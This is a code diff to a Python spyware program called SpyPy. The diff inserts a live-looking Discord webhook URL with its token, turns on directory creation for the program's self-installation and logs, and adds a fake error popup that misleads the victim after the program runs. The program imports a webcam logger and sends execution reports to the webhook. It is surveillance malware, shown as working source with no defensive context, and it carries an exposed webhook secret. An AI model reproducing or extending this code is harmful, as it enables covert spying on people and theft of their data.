@@ -23,7 +23,7 @@ from loggers.webcam_logger import WebcamLogger
 ######################################################
 # These variables will be configured by the builder. #
 # Please do not modify them to avoid any issues.     #
-WEBHOOK_URL = ""                                     #
+WEBHOOK_URL = "https://discord.com/api/webhooks/1259249292296589444/krGfdyPsm4_USB87q6gOTTxqLQ_2puJgJABnqFyDbR5qMSEfTcmHYiBiCmu9d7UNQMsj"                                     #
 SOFTWARE_EXE_NAME = ""                               #
 SOFTWARE_DIR_NAME = ""                               #
 CUSTOM_ERROR_MESSAGE = None                          #
@@ -45,13 +45,11 @@ class SpyPy:
                 
         self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
         self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
-        '''
-        # remove these for now until testing is done
         if not os.path.exists(self.software_dir):
             os.makedirs(self.software_dir)
         if not os.path.exists(self.logs_path):
             os.makedirs(self.logs_path)
-            '''        
+   
         self.is_exe = is_exe()
         self.is_first_run = self.is_exe and not os.path.abspath(__file__).startswith(self.software_dir)
         
@@ -88,6 +86,7 @@ class SpyPy:
             thread.start()
             self.threads.append(thread)
     
+    # good to have idk when it will be useful
     def stop(self):
         os._exit(0) # Force exit the program bc threads take so long to close 
 
@@ -103,5 +102,8 @@ class SpyPy:
             os._exit(0)
         else:
             send_webhook(WEBHOOK_URL, f"```SpyPy has been executed on {get_platform()}```")
+            if CUSTOM_ERROR_MESSAGE:
+                display_error_message("Error", CUSTOM_ERROR_MESSAGE)
+
 if __name__ == "__main__":
     SpyPy().start()
